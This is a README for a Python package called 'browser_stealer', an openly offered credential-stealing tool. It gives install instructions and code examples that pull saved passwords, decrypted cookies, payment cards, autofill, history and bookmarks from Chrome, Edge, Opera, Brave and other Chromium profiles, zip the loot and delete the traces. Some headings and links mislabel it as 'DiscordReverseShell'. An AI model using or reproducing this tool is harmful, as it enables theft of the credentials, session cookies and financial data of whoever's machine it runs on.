<!-- <h1 align="center">Browser Stealer<h1> -->

<p align="center">
  <img src="https:\\github.com\Josakko\browser_stealer\blob\main\img\banner.png?raw=true" alt="Browser Stealer">
</p>
  
<p align="center">
  <img src="https:\\img.shields.io\github\languages\top\Josakko\browser_stealer" </a>
  <img src="https:\\img.shields.io\github\last-commit\Josakko\browser_stealer" </a>
  <img src="https:\\img.shields.io\github\stars\Josakko\browser_stealer" </>
  <img src="https:\\img.shields.io\github\forks\Josakko\browser_stealer" </a>
</p>

<h4 align="center">
  <span style="color: #fff; font-weight: bold;">DiscordReverseShell</span>
  <span style="color: #fff; font-weight: normal;">v1.0.0</span>
</h4>

```
pip install browser_stealer
```

## Code Examples

Simple example for stealing data from profile "Default" of browsers: Chromium, Chrome, Opera, Opera GX, Brave, Edge
```py
import browser_stealer

browser_stealer.run()
```

Or you want to add your own chromium based browser or other profiles for existing ones:

```py
import browser_stealer


def MyBrowser():
    browser_stealer.fetch_passwords(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\Login Data", r"AppData\Local\%BROWSER%\%FOLDER%\User Data\Local State")
    browser_stealer.decrypt_fetch_cookies(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\Network\Cookies", r"AppData\Local\%BROWSER%\%FOLDER%\User Data\Local State")
    browser_stealer.fetch_cookies(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\Network\Cookies")
    browser_stealer.fetch_history(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\History")
    browser_stealer.fetch_downloads(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\History")
    browser_stealer.fetch_bookmarks(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\Bookmarks")
    browser_stealer.fetch_payment(r"AppData\Local\%BROWSER%\%FOLDER%\User Data\%PROFILE%\Web Data", r"AppData\Local\%BROWSER%\%FOLDER%\User Data\Local State")
    browser_stealer.fetch_autofill(r"AppData\Local\%BROWSER%\%FOLDER%e\User Data\%PROFILE%\Web Data")
    
    browser_stealer.zip("MyBrowser.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
    browser_stealer.delete_files(["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])

MyBrowser()
```

## Need Help?

If you need help contact me on my [discord server](https:\\discord.gg\xgET5epJE6) or create [issue](https:\\github.com\Josakko\DiscordReverseShell\issues).

## Contributors

Big thanks to all of the amazing people (only me) who have helped by contributing to this project!
